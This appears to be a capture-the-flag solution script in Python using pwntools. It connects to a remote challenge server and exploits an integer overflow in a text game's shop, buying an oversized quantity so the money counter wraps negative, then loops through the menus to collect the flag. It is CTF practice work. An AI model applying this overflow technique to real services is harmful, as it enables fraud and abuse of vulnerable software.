from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False

io = remote("0.cloud.chals.io", 15684)
io.sendlineafter("[ENTER]", "\n")
io.sendlineafter("3. PRI Upgrade\n\n", "1")
io.sendlineafter("3. +50 HP ($50)", "1")

# (2**31-1)/5=429496729.4
io.sendlineafter("Quantity?", "429496730")
io.sendlineafter("You have $-2147483635 left.\n\n", "\n")
io.sendlineafter("3. PRI Upgrade\n\n", "2")
io.sendlineafter("Quantity?", "214748365")
io.sendlineafter("left.\n\n", "\n")
io.sendlineafter("3. PRI Upgrade\n\n", "0")

a = io.recv()
while True:
    if b"#(1" in a:
        io.sendline("1")
    elif b"SHOP" in a or b"BOSS FIGHT" in a:
        io.sendline("0")
    elif b"flag" in a:
        success(a)
        break
    else:
        io.send("\n")

    a = io.recv()

io.interactive()
